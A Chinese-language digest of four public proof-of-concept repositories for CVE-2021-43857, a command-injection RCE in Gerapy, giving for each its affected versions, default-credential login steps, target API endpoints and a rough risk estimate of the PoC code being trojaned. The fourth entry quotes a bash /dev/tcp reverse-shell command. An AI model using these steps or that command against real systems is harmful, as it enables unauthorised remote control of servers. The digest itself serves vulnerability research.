# CVE-2021-43857

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-43857-G4sp4rCS_CVE-2021-43857-POC.md](../2021/CVE-2021-43857-G4sp4rCS_CVE-2021-43857-POC.md)

## CVE-2021-43857-Gerapy-远程代码执行

**漏洞编号:** CVE-2021-43857

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Gerapy

**危害等级:** 高危，允许未经授权的攻击者在服务器上执行任意代码

**影响版本:** < 0.9.8

**利用条件:** 需要目标Gerapy实例可网络访问，并知道或猜测到有效的用户名和密码（默认admin/admin可能有效）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-43857 是 Gerapy 0.9.8 之前版本中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，攻击者可以通过构造恶意请求，利用操作系统命令注入漏洞，在目标系统上执行任意命令。

**有效性:**
提供的PoC代码有效，因为它通过以下步骤利用漏洞：
1.  **登录:** 使用提供的用户名和密码登录 Gerapy 管理界面。
2.  **获取项目列表:** 登录后，获取项目列表，选择第一个项目进行攻击。
3.  **获取项目ID：** 获取项目构建信息，从中提取项目ID
4.  **触发Payload:**  构造包含反向shell命令的payload，通过`/api/project/{project_id}/parse`接口发送给Gerapy服务器。服务器执行该命令，建立与攻击者控制的机器之间的反向shell连接。

**投毒风险:**
PoC代码本身的主要目的是利用漏洞，并未发现明显的恶意投毒代码。但是，在安全领域，任何代码都存在潜在的风险，以下情况可能构成风险：
*  **依赖包篡改：** PoC 依赖于 requests 等第三方库。如果这些库被恶意篡改，可能会引入恶意代码。
*  **代码逻辑缺陷：** 虽然PoC的主要逻辑是漏洞利用，但如果存在未知的代码缺陷，可能会被利用执行其他恶意操作。
* **监听端口恶意程序:**subprocess.Popen使用存在恶意替换的程序.例如nc程序被替换
综合考虑，投毒风险较低，可以估计为5%。

**利用方式:**
1.  攻击者需要能够访问 Gerapy 实例的网络。
2.  攻击者需要知道或猜测到有效的用户名和密码（例如默认的 admin/admin）。
3.  攻击者运行 PoC 脚本，指定目标 IP 地址、端口、用户名、密码以及攻击者用于接收反向 shell 的 IP 地址和端口。
4.  PoC 脚本登录 Gerapy 管理界面，获取项目ID，然后发送包含恶意命令的请求到`/api/project/{project_id}/parse`接口，触发漏洞。
5.  Gerapy 服务器执行恶意命令，建立与攻击者控制的机器之间的反向 shell 连接，攻击者从而获得对服务器的控制权。

**项目地址:** [G4sp4rCS/CVE-2021-43857-POC](https://github.com/G4sp4rCS/CVE-2021-43857-POC)

**漏洞详情:** [CVE-2021-43857](https://nvd.nist.gov/vuln/detail/CVE-2021-43857)

---

## POC #2

**来源**: [CVE-2021-43857-LongWayHomie_CVE-2021-43857.md](../2021/CVE-2021-43857-LongWayHomie_CVE-2021-43857.md)

## CVE-2021-43857-Gerapy-远程代码执行

**漏洞编号:** CVE-2021-43857

**漏洞类型:** 远程代码执行

**影响应用:** Gerapy

**危害等级:** 严重，未经授权的攻击者可以执行任意系统命令。

**影响版本:** < 0.9.8

**利用条件:** 需要目标Gerapy实例版本低于0.9.8，并且攻击者需要知道或能够猜解默认的用户名和密码（admin/admin）。如果修改过默认密码，则需要知道修改后的密码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-43857 是 Gerapy 0.9.8 之前版本中的一个远程代码执行漏洞。根据漏洞描述，攻击者可以通过构造特定的请求，利用项目设置中的 spider 机制来执行任意系统命令。提供的 POC 代码首先尝试使用默认凭据（admin/admin）登录到 Gerapy 应用程序。登录成功后，它会获取项目列表，然后利用找到的第一个项目的 ID 来构造一个 URL，向该 URL 发送包含反向 shell payload 的恶意 spider 定义，从而实现远程代码执行。由于该POC代码目的是利用漏洞验证,并且没有发现恶意篡改行为,因此投毒风险为0。

**利用方式：**
1.  使用默认或已知的用户名和密码登录 Gerapy。
2.  获取现有项目的列表。
3.  获取项目中 spider 构建的 ID。
4.  构造包含反向 shell 命令的 payload。
5.  发送包含 payload 的请求，触发远程代码执行。

从搜索结果来看，该漏洞被广泛报道，并且存在公开可用的 Exploit-DB 漏洞利用代码。这进一步证实了该漏洞的有效性。

**项目地址:** [LongWayHomie/CVE-2021-43857](https://github.com/LongWayHomie/CVE-2021-43857)

**漏洞详情:** [CVE-2021-43857](https://nvd.nist.gov/vuln/detail/CVE-2021-43857)

---

## POC #3

**来源**: [CVE-2021-43857-ProwlSec_gerapy-cve-2021-43857.md](../2021/CVE-2021-43857-ProwlSec_gerapy-cve-2021-43857.md)

## CVE-2021-43857-Gerapy-远程代码执行

**漏洞编号:** CVE-2021-43857

**漏洞类型:** 远程代码执行

**影响应用:** Gerapy

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** < 0.9.8

**利用条件:** 目标服务器运行Gerapy < 0.9.8，攻击者可以网络访问Gerapy服务，并且知道或可猜测管理员账号密码（默认为admin/admin）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-43857是Gerapy 0.9.8之前版本中存在的一个远程代码执行漏洞。根据漏洞库信息，该漏洞是由于未正确过滤OS命令注入的特殊字符导致的。搜索引擎结果显示该漏洞影响Gerapy 0.9.7，并且有公开的漏洞利用代码（Exploit-DB）。提供的漏洞利用代码是一个Python脚本，它首先尝试使用默认凭据（admin/admin）登录Gerapy控制台。成功登录后，脚本会创建一个新的项目（如果项目不存在），然后利用漏洞执行远程命令。脚本还包含了自动启动Netcat监听器的功能，方便攻击者获取反向shell。

**有效性：**
提供的PoC代码有效，它复现了Exploit-DB上公开的漏洞，可以执行远程代码。

**投毒风险：**
该PoC代码主要包含以下部分：
1.  登录Gerapy。
2.  创建项目。
3.  发送包含恶意代码的请求，触发RCE漏洞。
4.  启动Netcat监听器。

虽然代码功能上基本实现了漏洞利用，但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **隐蔽的反向Shell地址修改**：攻击者可能修改了反向shell连接的IP地址和端口，将shell连接到攻击者控制的服务器，从而窃取受害者的系统信息。不过根据提供的代码，反向shell地址和端口是直接从命令行参数获取的，降低了这种风险。
*   **恶意代码注入**：攻击者可能在PoC代码中插入额外的恶意代码，例如，在创建项目或发送请求时，执行一些非预期的操作，例如信息收集、植入后门、拒绝服务等。

经过分析，该PoC代码存在轻微的投毒风险，可能性约为5%。

**利用方式：**
1.  使用默认凭据（admin/admin）或通过其他方式获取Gerapy管理员账号的访问权限。
2.  运行提供的Python脚本，并指定目标IP地址、端口以及本地监听IP地址和端口。
3.  脚本会自动登录Gerapy控制台，创建一个新的项目（如果项目不存在），然后发送包含恶意代码的请求，触发RCE漏洞。
4.  目标服务器会执行攻击者指定的命令，并将结果发送到攻击者指定的IP地址和端口。
5.  攻击者可以通过Netcat等工具监听指定的端口，获取目标服务器的反向shell。

**项目地址:** [ProwlSec/gerapy-cve-2021-43857](https://github.com/ProwlSec/gerapy-cve-2021-43857)

**漏洞详情:** [CVE-2021-43857](https://nvd.nist.gov/vuln/detail/CVE-2021-43857)

---

## POC #4

**来源**: [CVE-2021-43857-lowkey0808_CVE-2021-43857.md](../2021/CVE-2021-43857-lowkey0808_CVE-2021-43857.md)

## CVE-2021-43857-Gerapy-远程代码执行

**漏洞编号:** CVE-2021-43857

**漏洞类型:** 远程代码执行

**影响应用:** Gerapy

**危害等级:** 高危，可能导致完全控制服务器

**影响版本:** < 0.9.8

**利用条件:** 需要能够访问Gerapy服务，并且知道有效的用户名和密码

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-43857是Gerapy框架中存在的一个远程代码执行漏洞，影响版本小于0.9.8。攻击者可以利用此漏洞在目标服务器上执行任意代码。根据漏洞信息，漏洞是由于程序没有正确地过滤用户输入，导致OS命令注入。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，可以判断该漏洞利用代码是有效的。漏洞库信息明确指出Gerapy 0.9.8之前的版本存在远程代码执行漏洞（CWE-78，OS命令注入），CVSS评分高达9.8，属于严重级别。搜索引擎结果中也包含了多个关于此漏洞的描述和利用链接，例如Exploit-DB上的利用代码。

提供的漏洞利用代码首先通过/api/user/auth接口使用用户名和密码获取token，然后通过/api/project/robots/parse接口，将恶意构造的包含反弹shell命令的JSON数据发送到服务器，从而实现远程代码执行。

**投毒风险：**

分析提供的POC代码，发现存在一定的投毒风险，大约10%。风险主要体现在以下几个方面：

1.  **反弹Shell依赖：** POC代码中包含反弹shell的逻辑。如果目标机器上没有bash或者其他shell环境，利用可能会失败。而且反弹shell存在被防火墙拦截的风险。
2.  **维护者信息：**虽然作者声明了免责声明，但是代码中缺乏详细的注释和说明，增加了潜在的风险。

**利用方式：**

1.  **身份验证：** 攻击者需要知道Gerapy实例的有效用户名和密码。这可能通过暴力破解、社工或其他方式获得。
2.  **获取Token：** 使用已知的用户名和密码，通过/api/user/auth接口获取授权Token。
3.  **命令注入：** 构造包含恶意命令的JSON数据，该命令会被注入到操作系统层面执行。 POC使用`/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'` 实现反弹shell
4.  **发送Payload：** 将构造的JSON数据通过POST请求发送到/api/project/robots/parse接口。
5.  **反弹Shell：** 如果漏洞利用成功，目标服务器会反弹一个shell到攻击者的指定IP和端口。

**项目地址:** [lowkey0808/CVE-2021-43857](https://github.com/lowkey0808/CVE-2021-43857)

**漏洞详情:** [CVE-2021-43857](https://nvd.nist.gov/vuln/detail/CVE-2021-43857)

---

